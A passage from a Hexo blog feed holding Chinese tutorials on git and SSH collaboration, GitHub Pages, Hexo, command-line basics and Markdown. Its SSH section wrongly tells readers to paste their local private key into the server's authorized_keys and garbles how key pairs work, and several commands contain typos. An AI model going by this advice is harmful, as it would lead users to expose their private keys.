href="#多人协同开发：" class="headerlink" title="多人协同开发："></a>多人协同开发：</h3><ul><li>需要一台公网服务器（远程服务器） 借助 SSH 登录</li><li>需要在公网服务器上创建一个裸仓库<ul><li>所谓裸仓库是指没有工作区的目录</li><li><code>mkdir xxx.git</code> –&gt; <code>git init --bare</code>，执行这两条命令</li></ul></li><li><code>git push 远程仓库地址 master user@主机地址:目录</code> 远程仓库地址可以是 IP 地址格式也可以是域名格式</li><li><code>git pull 远程仓库地址 master user@主机地址:目录</code> 拿远程仓库上的 master 分支</li><li><code>git remote add 别名 真实地址</code> 真实地址太长，使用短的别名来替换</li><li><code>git remote show 别名</code> 查看真实地址</li></ul><blockquote><p>如何实现计算机之间的登录问题，通过 SSH 协议实现计算机之间的安全登录，实现协议的软件有 openssh。</p></blockquote><p>安装 openssh 后提供一个名字叫 ssh 的命令，通过此命令可以是现计算机之间的登录。<code>ssh user@host</code>，输入密码之后创建裸仓库</p><blockquote><p>知识点：ssh</p></blockquote><p>–&gt; <code>ssh-keygen -t rsa</code> 在我们的每个用户下创建公钥和私钥；</p><p>ssh 协议用来计算机之间安全登录的。通过一对公钥和私钥来实现信息的加密处理。</p><p>ssh 会通过公/私钥加密，通过 bash <code>ssh-keygen -t rsa</code> 命令生成。</p><p>公/私钥工作原理：传递的信息既可以通过公钥加密，也可以通过私钥加密，但最终都要进行解密，假如使用公钥加密，只能使用与其对应的私钥解密相反的，如果使用私钥加密，只能与其对应的公钥才能加密。SSH 会自动选择该使用谁进行加密。</p><p>通常在使用登录的时候，服务器在使用自己的公钥传递过来，本地计算机进行存储。下次再进行数据传递时会自动利用该公钥进行数据的加密，服务器接收到信息后会自动使用私钥将数据解开。</p><p>首相将本地私钥放到服务器上，当下次访问远程服务器时，服务会自动生成“一段小文本”并使用我们刚刚存的公钥进行加密，然后传递给我们。</p><p>免密码登录服务器，把自己的私钥放到服务器。</p><ul><li><code>/mhq</code> 在用户目录下</li><li><code>mkdir .ssh</code></li><li><code>cd .ssh</code></li><li><code>touch authorized_keys</code></li><li><code>vi authorized_keys</code></li><li><code>i</code></li><li><code>复制本地的私钥 粘贴</code></li><li><code>wq</code></li></ul><blockquote><p>现实开发中要解决多人协同开发的</p></blockquote><p>远程仓库，如何解决代码的共享问题：</p><p>–&gt; 远程服务器<br>–&gt; 登录<code>SSH 用户名@服务器地址</code> –&gt; yes –&gt; 输入密码<br>–&gt; <code>mkdir demo.git</code> 创建远程仓库<br>–&gt; 初始成裸仓库(专门共享代码的，没用工作区的仓库)<br>–&gt; <code>git init --bare</code>(变成了裸仓库了)<br>–&gt; <code>ls</code><br>–&gt; 在 bash 窗口中<br>–&gt; <code>git checkout master</code> 切换到 master 分支下<br>–&gt; <code>git push 用户名@192.168.32.101:/root/demo.git</code> (远程仓库的地址)</p><p>只需要创建一个裸仓库，剩下的 git 会自己管理。</p><p><code>git pull 用户名@192.168.32.101:/root/demo.git master</code> 从远程仓库拿到本地</p><ul><li><code>rm -rf</code></li><li><code>ls</code></li><li><code>mkdir demo</code></li><li><code>git init --bare</code></li><li><code>ls</code></li><li><code>git bush student@192.168.32.101:/home/student/demo master</code><ul><li>以 student 的身份登录，往这台服务器发送，: 表示要访问目录了</li><li>–&gt; 输入密码：</li></ul></li><li>另一个开发小伙伴：<code>git clone student@192.168.32.101:/home/student/demo</code><ul><li>–&gt; 输密码：<code>******</code></li></ul></li><li><code>git remote add hiraku git@地址</code> 给远程仓库起一个名字</li><li><code>git push hiraku master</code> 将修改内容放到远程仓库上去</li><li><code>git remote show hiraku</code> 查看比较短的 hiraku 的对应真实地址是什么</li><li><code>git remote add myself mhq@192.168.32.101:/mhq/demo.git</code> 添加多个</li><li><code>git push myself master</code></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><code>git init</code> 初始化一个新项目</li><li><code>git clone</code> 得到一个已有的仓库副本</li><li><code>git config --global user.name</code> 名称</li><li><code>git config --global user.email</code> 邮箱</li></ul><h4 id="基本操作详解"><a href="#基本操作详解" class="headerlink" title="基本操作详解"></a>基本操作详解</h4><ul><li><code>ls -al .git</code> 查看.git 文件下的所有文件</li><li><code>git init</code><ul><li>通过该命令创建一个本地仓库</li><li>执行过后，会在目录下生成一个 <code>.git</code>隐藏目录，最好不要手动修改</li></ul></li><li><code>touch .gitignore</code> 创建 .gitignore 文件</li><li><p><code>git status</code></p><ul><li>查看当前工作树状态</li><li>例如有新增的文件、修改的、删除的、等操作没有被添加到暂存区或者没有被提交</li><li>都可以通过 git status 命令看到</li></ul></li><li><code>git add 文件名.后缀</code> 或者 <code>git add --all</code> 添加所有文件<ul><li>将制定的文件添加到暂存区（待提交列表）</li></ul></li><li><code>git commit -m &quot;描述&quot;</code><ul><li>将暂存区（待提交列表）中的文件提交到本地仓库，形成一个历史快照</li></ul></li><li><code>git log</code><ul><li>查看提交日志</li></ul></li><li><code>gitk</code><ul><li>以图形化的界面查看本地仓库提交日志状态</li></ul></li><li><code>git push</code><ul><li>连接到远程仓库</li><li>需要输入账号名</li><li>需要输入密码</li></ul></li></ul><h4 id="git基本命令"><a href="#git基本命令" class="headerlink" title="git基本命令"></a>git基本命令</h4><p><a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">git基本命令</a></p><h4 id="gitk命令打开的界面"><a href="#gitk命令打开的界面" class="headerlink" title="gitk命令打开的界面"></a>gitk命令打开的界面</h4><blockquote><p>在安装 Git 的同时，你也装好了它提供的可视化工具，gitk 和 git-gui。<br>gitk 是一个历史记录的图形化查看器，你可以把它当作是基于 git log 和 git grep 命令的一个强大的图形操作界面，当你需要查找过去发生的某次记录，或是可视化查看项目历史的时候，你将会用到这个工具。<br>使用 Gitk 的最简单方法就是从命令行打开，只需 cd 到一个 Git 仓库，然后键入：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gitk [git log options]</span><br></pre></td></tr></table></figure><blockquote><p>Gitk 可以接受很多命令行选项，其中的大部分都直接传给底层的 git log 去执行了。 –all可能是这其中最有用的一个, 它告诉 gitk 去尽可能地从任何引用查找提交并显示，而不仅仅是从 HEAD，Gitk 的界面看起来长这样</p></blockquote><p><img src="/images/gitk.png" alt="gitk命令 打开的界面"></p><h4 id="更改提交的操作"><a href="#更改提交的操作" class="headerlink" title="更改提交的操作"></a>更改提交的操作</h4><p>指定文件回滚：</p><ul><li><code>git checkout commit提交时的节点前五位 文件名.后缀</code></li><li><code>git checkout [file]</code><ul><li>恢复暂存区的指定文件到工作区</li></ul></li><li><code>git checkout [commit] [file]</code><ul><li>恢复某个commit的指定文件到暂存区和工作区</li></ul></li><li><code>git checkout commit ...</code><ul><li>恢复暂存区的所有文件到工作区</li></ul></li></ul><p>指定版本回滚：</p><ul><li><code>git reset --hard HEAD^</code><ul><li>恢复暂存区和工作区到上一次最新的提交</li><li>回退一个版本</li></ul></li><li><code>git reset --hard 提交哈希值</code><ul><li>根据提交哈希值（版本号）回溯到历史版本，首先得知道到底有哪些值</li><li>–hard 意味着把指针挪一个位置，工作区和暂存区都移了位置</li><li>–soft log 只剩两次了，只是指针变了</li><li>–mixed 历史会变、暂存区也变，工作区不变。</li></ul></li><li><code>git reflog</code><ul><li>查看当前仓库操作日志</li></ul></li><li><code>git commit --amend</code><ul><li>修改最近一次提交的提交日志</li></ul></li></ul><p>更新仓库：</p><p>本地仓库更新到和远程仓库一样</p><ul><li><code>touch index.js</code> 创建文件</li><li><code>git status</code></li><li><code>git checkout -b aaa</code> 创建平行分支</li><li><code>git push hiraku aaa</code> 远程仓库下创建一个相同的分支</li><li><code>git fetch</code></li><li><code>git branch -a</code> 查看远程分支和本地分支</li><li><code>git merger</code> 远程分支名称 远程和本地同步</li><li><code>git pull</code> = <code>git fetch</code> + <code>git merge</code></li><li><code>git push hiraku --delete aaa</code> 删除远程仓库下的 aaa 分支</li><li><code>git push 远程地址 本地分支：远程分支</code> 添加分支</li><li><code>git push 远程地址 本地分支</code> 添加分支 简写，相当于 <code>git push 远程地址 aaa:bbb</code> 本地 aaa 放到远程 bbb。</li></ul><p>推送至远程仓库</p><p>如果已经有了一个本地仓库，就可以通过下面的形式和线上的空仓库产生关联：</p><ul><li><p><code>git remote add origin 远程仓库地址</code></p><ul><li>git 会自动将远程仓库地址起个别名 origin</li></ul></li></ul><ul><li><p>git push -u origin master</p><ul><li>推送到名称为 origin 远程仓库地址下的 master 分支下</li></ul></li></ul><p>从远程仓库获取</p><ul><li><code>git clone 仓库地址</code> = <code>git init</code> + <code>git pull 地址 master</code> + <code>git remote add origin</code><ul><li>git 会自动将 origin 设置为该远程仓库地址的标识符</li></ul></li><li><code>git pull 地址 分支</code><ul><li>本地得有一个仓库</li></ul></li></ul><h3 id="git-高级"><a href="#git-高级" class="headerlink" title="git 高级"></a>git 高级</h3><ul><li><code>git difftool</code> 比较工作区和暂存区的差异</li><li><code>git difftool</code> 提交记录1 比较工作区和特定提交的差异</li><li><code>git difftool</code> 提交记录1 提交记录2 这两次提交的差异</li><li><code>git difftool cart</code> 查看当前分支和 cart 分支的差异</li></ul><h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p><img src="/images/github-octocat.png" alt="github-octocat.png"></p><p><a href="https://github.com/" target="_blank" rel="noopener">Github</a> 是为开发者提供 Git 仓库的托管服务。<br>是一个可以让开发者与朋友、同事、同学及陌生人共享代码的完美平台。<br>简而言之，Github 就是程序员的新浪微博，社交化编程。</p><ul><li><a href="https://guides.github.com/" target="_blank" rel="noopener">GitHub Guides</a></li><li><a href="https://www.youtube.com/githubguides" target="_blank" rel="noopener">GitHub Training &amp; Guides</a></li><li><a href="http://item.jd.com/11733256.html" target="_blank" rel="noopener">GitHub入门与实践</a></li></ul><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li>Github 与 Git 的区别<ul><li>Git 是一个分布式版本控制系统<ul><li>历史记录的问题</li><li>多人协作的问题</li></ul></li><li>Github 是为开发者提供 Git 仓库的托管服务</li></ul></li><li>不仅仅是 Git 仓库的托管服务</li><li>社交元素：项目点赞、关注项目Watch、Pull Request 等功能<ul><li>Pull Request：假设你修改了一个开源仓库源代码</li><li>你可以通过 Pull Request 请求合并，请求合并到源代码仓库中</li><li>当你发送了请求合并，别人会收到你的合并请求，然后会检查你的合并请求，如果没有问题，就可以直接合并到源代码库中</li></ul></li><li>Github Flavored Markdown<ul><li>写说明文档、发布评论等都使用的是 Markdown</li></ul></li><li>基本上各大开源产品都在 Github 上<ul><li>jQuery、bootstrap、AngularJS、Vue、React、Node</li></ul></li></ul><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><ul><li>创建账户</li><li>设置头像</li><li>创建仓库</li><li>连接仓库</li><li>公开代码<ul><li>克隆仓库 git clone 仓库地址</li><li>编写代码</li><li>提交 git add 文件名(添加某一个文件) –&gt; git commit -m “提交说明”</li><li>进行 git push 发布到远程仓库</li></ul></li></ul><h3 id="使用-Github-Pages-搭建静态站点"><a href="#使用-Github-Pages-搭建静态站点" class="headerlink" title="使用 Github Pages 搭建静态站点"></a>使用 Github Pages 搭建静态站点</h3><p>我们可以把静态网站部署到 Github 上，然后通过特定的域名就可以访问了。</p><ol><li>在 github 上创建一个空仓库，仓库名称以 <code>自己github用户名.github.io</code></li><li>克隆仓库地址到本地 git clone <a href="https://github.com/honeyYoung/honeyyoung.github.io" target="_blank" rel="noopener">https://github.com/用户名/用户名.github.io</a> 文件名</li><li>将静态页的代码放到本地仓库中</li><li>过滤掉不需要上传到远程仓库的文件或文件夹<ul><li>cd 本地仓库根目录</li><li>创建 <code>.gitignore</code> 文件, 将不需要跟踪的文件添加到<code>.gitignore</code> 文件中，</li><li>比如：.idea demo</li></ul></li><li>然后提交文件到该仓库中，注意：仓库根路径必须有一个 index.html 文件<ul><li><code>git add --all</code></li></ul></li><li>接下来就可以通过 <code>自己的github用户名.github.io</code> 来访问你托管的那个静态网站仓库了，默认去找 index.html 页面</li></ol><p>还可以通过创建不同名字的仓库用来托管别的静态网站项目，如果想要通过你的github域名来访问，就必须把你托管的文件放到一个叫做 <code>gh-pages</code> 的分支中。然后就可以通过 <code>github用户名.github.io/拥有gh-pages分支的仓库名称</code> 来访问你的这个网站了。</p><ul><li>克隆</li></ul><h3 id="github-项目开源，协同开发"><a href="#github-项目开源，协同开发" class="headerlink" title="github 项目开源，协同开发"></a>github 项目开源，协同开发</h3><p>主动邀请 –&gt; collaborators<br>fork –&gt; 自己的项目下就会有一个一模一样的仓库<br>Pull requests –&gt; new pull request<br>Issues –&gt; 讨论问题</p><h2 id="使用-Hexo-搭建自己的个人静态博客"><a href="#使用-Hexo-搭建自己的个人静态博客" class="headerlink" title="使用 Hexo 搭建自己的个人静态博客"></a>使用 Hexo 搭建自己的个人静态博客</h2><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo官方网站</a></p><ul><li>必须安装 Node 环境<ul><li>通过在终端任意目录输入 <code>node -v</code> 查看是否有输入node的版本</li></ul></li><li>在终端的任意目录输入 <code>npm install -g hexo-cli</code> 然后回车执行等待安装成功<ul><li>通过输入 <code>hexo --version</code> 如果看到输入一大堆的版本号就说明安装成功了</li><li>Hexo 是一个命令行应用程序</li></ul></li><li>接下来通过输入 <code>hexp init 博客项目存储目录</code><ul><li>Hexo 会在你执行该命令的目录下生成一个博客项目</li><li>初始化博客项目的过程需要联网</li></ul></li><li>接下来通过终端进入刚才创建的博客项目目录，然后在该目录下输入 <code>npm install</code> 回车等待执行结束</li><li>接下来输入 <code>hexo server</code> 回车执行，它会在你的本地启动一个服务器，然后就可以访问你的博客项目</li><li>进入博客项目，输入 <code>hexo new 文章名称</code> 创建博客<ul><li>该命令会自动在 source/_posts/ 目录下生成一个 文章名称.md 文件</li></ul></li><li>生成静态文件：<code>hexo generate</code><ul><li>该命令会自动在项目的根目录下的 public 目录下降静态文件放进去吧</li></ul></li><li><p>快速部署</p><ul><li>修改配置文件</li><li>在项目根路径下执行 <code>npm install hexo-deployer-git --save</code> 该命令</li><li><code>npm</code> 在安装 node 时自动安装了</li><li>接下来就可以直接输入 <code>hexo deploy --generate</code> 自动发布到 github 上</li></ul></li><li>删除命令 ： <code>rm -rf 文件夹名</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;版本控制&quot;&gt;&lt;a href=&quot;#版本控制&quot; class=&quot;headerlink&quot; title=&quot;版本控制&quot;&gt;&lt;/a&gt;版本控制&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;了解版本管理概念以及集中式和分布式版本管理&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;需要解决两个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;历史记录保留的问题&lt;/li&gt;
&lt;li&gt;多人协同开发问题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;什么是版本控制呢？&lt;/p&gt;
&lt;p&gt;版本控制就是管理更新的历史记录，它给我们提供了一些在软件开发过程中必不可少的功能，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;记录一款软件添加或更改源代码的过程&lt;/li&gt;
&lt;li&gt;回滚到特定阶段，恢复误删除的文件&lt;/li&gt;
&lt;li&gt;合并多人协作的文件等&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web Development Tools" scheme="http://yoursite.com/categories/Web-Development-Tools/"/>
    
    
      <category term="git" scheme="http://yoursite.com/tags/git/"/>
    
      <category term="github" scheme="http://yoursite.com/tags/github/"/>
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
  </entry>
  
  <entry>
    <title>命令行</title>
    <link href="http://yoursite.com/2016/07/18/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    <id>http://yoursite.com/2016/07/18/命令行/</id>
    <published>2016-07-17T16:00:00.000Z</published>
    <updated>2018-06-05T08:51:41.605Z</updated>
    
    <content type="html"><![CDATA[<p>学习命令行最好的方式是学习 Linux 上的 shell、bash</p><h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><h3 id="GUI-用户界面-VS-CLI-命令行界面"><a href="#GUI-用户界面-VS-CLI-命令行界面" class="headerlink" title="GUI(用户界面) VS CLI(命令行界面)"></a>GUI(用户界面) VS CLI(命令行界面)</h3><p>大多数的计算机用户只是熟悉图形用户界面（GUI），并且产品供应商和此领域的学者会灌输给用户这样的思想，命令行界面（CLI）是过去使用的一种很恐怖的东西。这就很不幸，因为一个好的命令行界面，是用来和计算机进行交流沟通的非常有效的方式，正像人类社会使用文字互通信息一样。人们说，<strong>图形用户界面让简单的任务更容易完成，而命令行界面使完成复杂的任务成为可能</strong>，到现在这句话仍然很正确。</p><a id="more"></a><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>一说到命令行，其实真正指的是 <code>shell</code>。</p><p><strong>shell 就是一个程序，它接受从键盘输入的命令，然后把命令传递给操作系统去执行。</strong></p><p>几乎所有的 Linux 发行版都提供一个名为 <code>bash</code> 的 shell 程序。<code>bash</code> 是 <code>Bourne Again SHell</code> 的首字母缩写，所指的是这样一个事实。</p><h3 id="终端仿真器"><a href="#终端仿真器" class="headerlink" title="终端仿真器"></a>终端仿真器</h3><p>当使用图形用户界面时，我们需要另一个和 shell 交互的叫做终端仿真器的程序。在 Windows 上，一般使用操作系统自带的 <code>cmd</code> 或者 <code>powershell</code>。在 Linux 上，如果是图形用户界面，那么可以使用 <code>terminal</code> 或者 <code>konsole</code>、<code>gnome-terminal</code> 之类的终端仿真器，但基本上，它们都完成同样的事情，让我们能访问 shell，可能会因为附加的一些花俏功能而喜欢上某个终端。</p><p>关于名字，如果有人提到：控制台、终端、bash、shell、terminal 等，一般都是指上面这些。</p><p>一般在 Linux 上，都会提供一个 bash 或者 terminal 之类的工具，让你来使用 shell。</p><h3 id="安装-Git-for-Windows-客户端体验-shell"><a href="#安装-Git-for-Windows-客户端体验-shell" class="headerlink" title="安装 Git for Windows 客户端体验 shell"></a>安装 Git for Windows 客户端体验 shell</h3><p>Git for Windows 客户端自带了一个终端仿真器：<code>git bash</code></p><p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">Git 下载地址：</a></p><p><a href="https://github.com/git-for-windows/git" target="_blank" rel="noopener">git for Windows - github 托管地址</a><br>，然后找到 Realease 模块，找到下载的对应版本即可。</p><p>注意：虽然在 Windows 上可以通过 cmd 或 powershell 体验终端的使用，但是学习终端最正确的方式是学习 Linux 上的命令行，要更纯正，更强大。</p><p>我们通过使用 Git for Windows 客户端（自带了一个 bash）来学习 shell。</p><h3 id="打开和退出终端"><a href="#打开和退出终端" class="headerlink" title="打开和退出终端"></a>打开和退出终端</h3><ul><li>开始菜单打开</li><li>右键打开</li><li>通过开始-运行：输入 git-bash 打开（需要PATH环境变量）</li></ul><h4 id="命令提示符"><a href="#命令提示符" class="headerlink" title="命令提示符"></a>命令提示符</h4><p>git bash 中使用 <code>~</code> 来表示用户目录</p><h4 id="使用终端操作文件系统"><a href="#使用终端操作文件系统" class="headerlink" title="使用终端操作文件系统"></a>使用终端操作文件系统</h4><ul><li>绝对路径和相对路径</li><li>pwd（print working directory）</li><li>cd（change directory）<ul><li>切换到指定路径（相对路径或绝对路径）</li></ul></li><li>ls（list files）<ul><li><code>ls</code> 列出当前目录文件</li><li><code>ls 目录路径</code> 列出指定路径文件</li><li><code>ls -a</code> 列出文件并显示隐藏文件或目录</li></ul></li><li>cp（copy）<ul><li><code>cp 源路径 目标路径</code></li><li>cp 在复制目录的时候，不会复制里面的子文件或子目录</li><li>-r （recursive）递归复制</li></ul></li><li><code>mv</code>（move）：移动文件或者目录，还可以重命名文件或目录</li><li><code>mkdir</code>（make directory）：创建目录</li><li><code>rm</code>（remove）：删除文件或目录<ul><li>-rf 递归删除：直接将整个目录包括里面的内容都删掉</li></ul></li><li><code>rmdir</code> 目录名称<ul><li>只能删除空目录</li></ul></li><li><code>clear</code>：清屏</li><li><code>touch 文件名</code><ul><li>根据文件名创建新的文件</li></ul></li><li><code>cat</code> 文件名<ul><li>查看指定的文本文件</li></ul></li></ul><h3 id="使用-less-命令浏览文件内容"><a href="#使用-less-命令浏览文件内容" class="headerlink" title="使用 less 命令浏览文件内容"></a>使用 less 命令浏览文件内容</h3><p>less 命令是一个用来浏览文本文件的程序。</p><p>less 命令是这样使用的：<code>less 文本文件名</code></p><p>一旦 less 程序运行起来，我们就能浏览文件内容了。如果文件内容多于一页，那么我们可以上下滚动文件。按下 <code>q</code> 键，退出 less 程序。</p><p>下表列出了 less 程序最常使用的键盘命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">命令               行为</span><br><span class="line">h                  显示帮助屏幕</span><br><span class="line">Page UP or b       向上翻滚一页</span><br><span class="line">Page Down or space 向下翻滚一页</span><br><span class="line">UP Arrow           向上翻滚一行</span><br><span class="line">Down Arrow         向下翻滚一行</span><br><span class="line">G                  移动到最后一行</span><br><span class="line">g                  移动到开头一行</span><br><span class="line">/charaters         向前查找指定的字符串</span><br><span class="line">n                  向前查找下一个出现的字符串，这个字符串是之前所指定查找的</span><br><span class="line">q                  退出 less 程序</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习命令行最好的方式是学习 Linux 上的 shell、bash&lt;/p&gt;
&lt;h2 id=&quot;命令行&quot;&gt;&lt;a href=&quot;#命令行&quot; class=&quot;headerlink&quot; title=&quot;命令行&quot;&gt;&lt;/a&gt;命令行&lt;/h2&gt;&lt;h3 id=&quot;GUI-用户界面-VS-CLI-命令行界面&quot;&gt;&lt;a href=&quot;#GUI-用户界面-VS-CLI-命令行界面&quot; class=&quot;headerlink&quot; title=&quot;GUI(用户界面) VS CLI(命令行界面)&quot;&gt;&lt;/a&gt;GUI(用户界面) VS CLI(命令行界面)&lt;/h3&gt;&lt;p&gt;大多数的计算机用户只是熟悉图形用户界面（GUI），并且产品供应商和此领域的学者会灌输给用户这样的思想，命令行界面（CLI）是过去使用的一种很恐怖的东西。这就很不幸，因为一个好的命令行界面，是用来和计算机进行交流沟通的非常有效的方式，正像人类社会使用文字互通信息一样。人们说，&lt;strong&gt;图形用户界面让简单的任务更容易完成，而命令行界面使完成复杂的任务成为可能&lt;/strong&gt;，到现在这句话仍然很正确。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Development Tools" scheme="http://yoursite.com/categories/Web-Development-Tools/"/>
    
    
      <category term="git" scheme="http://yoursite.com/tags/git/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
      <category term="命令行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>markdown</title>
    <link href="http://yoursite.com/2016/07/08/markdown/"/>
    <id>http://yoursite.com/2016/07/08/markdown/</id>
    <published>2016-07-07T16:00:00.000Z</published>
    <updated>2018-06-05T08:31:12.431Z</updated>
    
    <content type="html"><![CDATA[<p>markdown 轻量级标记语言（html、xml），它允许人们“使用易读易写的纯文本格式编写文档”，Markdown 最重要的设计就是可读性，Markdown 可以选择性的转换为 HTML 文档格式，很多网站目前都使用了 Markdown 或者其变种，例如Github、简书等大型社区。</p><h2 id="markdown-特点"><a href="#markdown-特点" class="headerlink" title="markdown 特点"></a>markdown 特点</h2><ul><li>纯文本，所以兼容性极强，可以用所有文本编辑器打开</li><li>专注于文字写作而不是排版</li><li>格式转换方便，可以轻松转换为 HTML、PPT、电子书等</li><li>Markdown 标记语法简单好记，可读性强</li></ul><a id="more"></a><h3 id="实时预览编辑器"><a href="#实时预览编辑器" class="headerlink" title="实时预览编辑器"></a>实时预览编辑器</h3><p><a href="http://www.williamlong.info/archives/4319.html" target="_blank" rel="noopener">月光博客 - 好用的Markdown编辑器一览</a></p><ul><li>dillinger</li><li>马克飞象</li><li>简书</li><li>MarkdownPad</li><li>Sublime Text<ul><li>配合 <code>Markdown Preview</code> 插件</li></ul></li><li>Webstorm<ul><li>配合插件</li></ul></li><li>gitbook</li></ul><p>编辑实时预览工具只是为了辅助教学而已，我们真正在进行写作的时候，其实是不需要实时预览的，因为 Markdown 标记语言本身已经足够清晰了。</p><h3 id="Markdown-基本语法"><a href="#Markdown-基本语法" class="headerlink" title="Markdown 基本语法"></a>Markdown 基本语法</h3><p>注意：每个标题、段落、图片、代码段、一个列表之间都用一行空行分开；</p><ul><li>标题<ul><li><code>#</code>: 表示 h1,</li><li><code>##</code>: 表示 h2,</li><li><code>###</code>: 表示 h3,</li><li><code>####</code>: 表示 h4,</li><li><code>#####</code>: 表示 h5,</li><li><code>#####</code>: 表示 h6</li></ul></li><li>段落<ul><li>直接写，不用任何空格</li></ul></li><li>Markdown中粗体与斜体非常简单，用两个<em>号把文字包围相当于粗体，用一个</em>号把文字包围相当于斜体。使用两个~~号包围则显示删除线效果。</li><li>粗体   <strong>粗体</strong>  </li><li>斜体   <em>斜体</em> </li><li>删除线 <del>删除</del></li><li>无序列表<ul><li>一级用 <code>-</code> 加一个空格</li><li>二级用 一个 <code>tab</code> 之后加一个 <code>+</code> 和一个空格</li><li>三级同样再放一个 <code>tab</code>之后加一个 <code>*</code> 和一个空格</li></ul></li><li>有序列表<ul><li><code>数字.</code> 加空格</li></ul></li><li>链接<ul><li><code>[连接名称](连接url)</code></li></ul></li><li>图片<ul><li><code>![图片名称](图片路径url)</code></li></ul></li><li>`文本引用<ul><li>用一个 <code>&gt;</code> 来引用</li></ul></li><li>行内代码引用<ul><li>一对反引号包裹，esc 下面的键</li></ul></li><li>多行代码引用<ul><li>一对三个反引号包裹</li></ul></li><li>表格<br>表格比较特殊，不太好用，下面是规范写法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| ABCD | EFGH | IJKL |</span><br><span class="line">| -----|:----:| ----:|</span><br><span class="line">| a    | b    | c    |</span><br><span class="line">| d    | e    |  f   |</span><br><span class="line">| g    | h    |   i  |</span><br></pre></td></tr></table></figure><h3 id="Markdown-使用场景"><a href="#Markdown-使用场景" class="headerlink" title="Markdown 使用场景"></a>Markdown 使用场景</h3><ul><li>学习笔记<ul><li>手写笔记</li></ul></li><li>演讲稿<ul><li>技术沙龙，party</li><li>Markdown 演讲稿</li></ul></li><li>写书（侧重于技术相关的内容非常适合）</li><li>个人笔记</li><li>文章博客</li><li>教学讲义</li><li>说明文档<ul><li>使用比较多，软件的说明文档或者开源项目的说明文档</li></ul></li><li>电子邮件</li></ul><p>只要有写作的地方，都可以使用 Markdown 来书写。</p><h3 id="用-Markdown-编辑电子邮件"><a href="#用-Markdown-编辑电子邮件" class="headerlink" title="用 Markdown 编辑电子邮件"></a>用 Markdown 编辑电子邮件</h3><p>Markdown 本身语法简单，使用 Markdown 写出来的内容结构也非常清晰，有助于协作沟通，总而言之，使用 Markdown 可以可以更加专注写作本身。</p><p>其实就是将 md 格式字符串转换成 html 而已，这里使用一个 Chrome 插件：</p><p><a href="https://chrome.google.com/webstore/detail/markdown-here/elifhakcjgalahccnjkneoccemfahfoa?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">Markdown Here</a></p><h3 id="使用-GitBook-制作电子书"><a href="#使用-GitBook-制作电子书" class="headerlink" title="使用 GitBook 制作电子书"></a>使用 GitBook 制作电子书</h3><p><a href="https://www.gitbook.com/" target="_blank" rel="noopener">GitBook</a></p><ul><li>在线 Web 端写</li><li>使用客户端软件写<ul><li><a href="https://www.gitbook.com/editor" target="_blank" rel="noopener">下载地址：</a></li></ul></li><li>终端命令行工具可以辅助生成</li></ul><h3 id="自己动手做一个-Markdown-实时预览编辑器"><a href="#自己动手做一个-Markdown-实时预览编辑器" class="headerlink" title="自己动手做一个 Markdown 实时预览编辑器"></a>自己动手做一个 Markdown 实时预览编辑器</h3><p>Markdown 本身就是一个标记语言，可以通过某种方式转换成别的文本格式，本质上转换的过程其实就是做正则解析替换。</p><ul><li>如何将markdown格式字符串转成html<ul><li>使用一个第三方包：<code>marked</code></li><li><code>npm install marked</code></li></ul></li><li>给 html 设置样式</li><li>给代码块设置颜色高亮<ul><li>highlightjs</li></ul></li></ul><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><ul><li><a href="https://zh.wikipedia.org/wiki/Markdown" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Markdown</a></li><li><a href="http://www.jianshu.com/p/q81RER" target="_blank" rel="noopener">http://www.jianshu.com/p/q81RER</a></li><li><a href="http://wowubuntu.com/markdown/" target="_blank" rel="noopener">http://wowubuntu.com/markdown/</a></li><li><a href="http://www.jianshu.com/p/PpDNMG" target="_blank" rel="noopener">http://www.jianshu.com/p/PpDNMG</a></li><li><a href="http://www.jianshu.com/p/qqGjLN" target="_blank" rel="noopener">http://www.jianshu.com/p/qqGjLN</a></li><li><a href="https://www.zhihu.com/question/20409634" target="_blank" rel="noopener">https://www.zhihu.com/question/20409634</a></li><li><a href="http://www.markdown.cn/" target="_blank" rel="noopener">http://www.markdown.cn/</a></li></ul>]]></content>
    
    <summary type="html">
    
